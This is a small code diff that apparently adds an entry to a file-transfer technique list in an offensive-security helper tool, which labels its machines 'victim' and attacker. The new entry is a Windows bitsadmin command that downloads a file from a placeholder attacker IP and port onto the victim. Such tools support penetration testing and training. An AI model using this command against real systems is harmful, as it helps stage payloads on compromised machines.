@@ -85,6 +85,15 @@ const techniques = [
       commands: [
         { machine: "victim", command: "upload {filename}" }
       ]
+    },
+    {
+      id: 9,
+      fileTo: "victim", 
+      name: "bitsadmin",
+      platforms: ["Windows"],
+      commands: [
+        { machine: "victim", command: "bitsadmin /Transfer myJob http://{attacker_ip}:{attacker_port}/{filename} {filename}" }
+      ]
     }
   ];
   
